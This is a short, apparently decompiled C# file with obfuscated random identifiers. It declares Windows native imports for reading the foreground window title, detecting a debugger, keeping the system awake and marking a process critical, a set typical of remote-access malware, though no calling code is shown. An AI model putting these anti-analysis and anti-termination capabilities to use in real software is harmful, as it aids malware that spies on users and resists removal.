using System;
using System.Runtime.InteropServices;
using System.Text;

namespace ktQiwKnbqDow;

public static class jnKCjbUoiPrfOm
{
	public enum CbJjSlstirhnJU : uint
	{
		zZGgWiyDsLapbs = 2147483648u,
		FpxErbJCAn = 2u,
		pyUiKKxERRy = 1u
	}

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr mggCWFmjlijANMd, StringBuilder TrLCutKYOCFkH, int XHMIeAVqsVEfO);

	[DllImport("kernel32.dll")]
	public static extern IntPtr GetModuleHandle(string LjTOcKuCcPu);

	[DllImport("kernel32.dll", ExactSpelling = true, SetLastError = true)]
	public static extern bool CheckRemoteDebuggerPresent(IntPtr RcHDyggPxMZgJ, ref bool WQaAcekspwysP);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern CbJjSlstirhnJU SetThreadExecutionState(CbJjSlstirhnJU GLDMHDIWWorDh);

	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint UXbMIXWLItpJR, uint yQNPUuBUHBHm, uint rIOiePPGzaP);
}
